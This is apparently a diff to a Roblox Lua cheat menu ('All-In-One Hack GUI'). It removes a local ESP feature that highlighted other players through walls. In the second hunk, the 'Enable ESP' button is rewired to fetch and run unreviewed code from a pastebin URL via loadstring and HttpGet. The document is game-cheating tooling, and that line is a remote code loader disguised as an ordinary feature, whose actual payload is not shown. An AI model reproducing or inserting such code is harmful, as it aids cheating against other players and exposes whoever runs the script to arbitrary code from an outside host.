@@ -27,7 +27,7 @@ MainFrame.Draggable = true
 Title.Parent = MainFrame
 Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "Advanced Hack GUI"
+Title.Text = "All-In-One Hack GUI"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 18
@@ -227,32 +227,8 @@ ESPButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 ESPButton.Font = Enum.Font.Gotham
 ESPButton.TextSize = 14
 
-local espEnabled = false
-local highlights = {}
-
 ESPButton.MouseButton1Click:Connect(function()
-    espEnabled = not espEnabled
-    ESPButton.Text = espEnabled and "Disable ESP" or "Enable ESP"
-
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player ~= game.Players.LocalPlayer then
-            if espEnabled then
-                if player.Character and not highlights[player.Name] then
-                    local highlight = Instance.new("Highlight")
-                    highlight.Adornee = player.Character
-                    highlight.Parent = player.Character
-                    highlight.FillColor = Color3.new(0, 1, 0)
-                    highlight.OutlineColor = Color3.new(1, 1, 1)
-                    highlights[player.Name] = highlight
-                end
-            else
-                if highlights[player.Name] then
-                    highlights[player.Name]:Destroy()
-                    highlights[player.Name] = nil
-                end
-            end
-        end
-    end
+    loadstring(game:HttpGet('https://pastebin.com/raw/zzhc9DPv'))()
 end)
 
 -- WalkSpeed Slider
